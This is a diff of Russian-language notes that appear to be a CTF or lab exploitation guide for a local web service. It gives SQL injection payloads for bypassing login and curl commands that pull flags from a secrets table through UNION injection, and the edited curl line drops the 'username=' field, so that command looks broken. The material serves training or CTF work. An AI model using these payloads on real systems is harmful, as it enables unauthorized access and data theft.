@@ -89,8 +89,7 @@ secrets(id, name, flag, owner, category)   -- <-- здесь флаги
    query = "SELECT * FROM users WHERE username = '" + username +
            "' AND password = MD5(CONCAT('" + password + "', salt))"
    ```
-   Атака: `' OR 1=1 -- -` в поле логина (войдёт первый пользователь — admin).
-   Точнее к цели: `' OR '1'='1' -- -` или подстановка чужого md5.
+   Атака: `admin'-- -` в поле логина (войдёт первый пользователь — admin).
 
 2. **`GET /users/search?q=`** — UNION-based инъекция (4 колонки видны в выводе):
    ```
@@ -108,7 +107,7 @@ secrets(id, name, flag, owner, category)   -- <-- здесь флаги
 
 ```bash
 # вход без пароля
-curl -s -c jar -d "username=' OR 1=1 -- -&password=x" http://localhost:8000/login -i
+curl -s -c jar -d "admin'-- -&password=x" http://localhost:8000/login -i
 # кража флагов через UNION (нужна сессия любого пользователя)
 curl -s -b jar "http://localhost:8000/users/search?q=%27%20UNION%20SELECT%20id,flag,owner,1%20FROM%20secrets--%20-"
 # или напрямую к базе
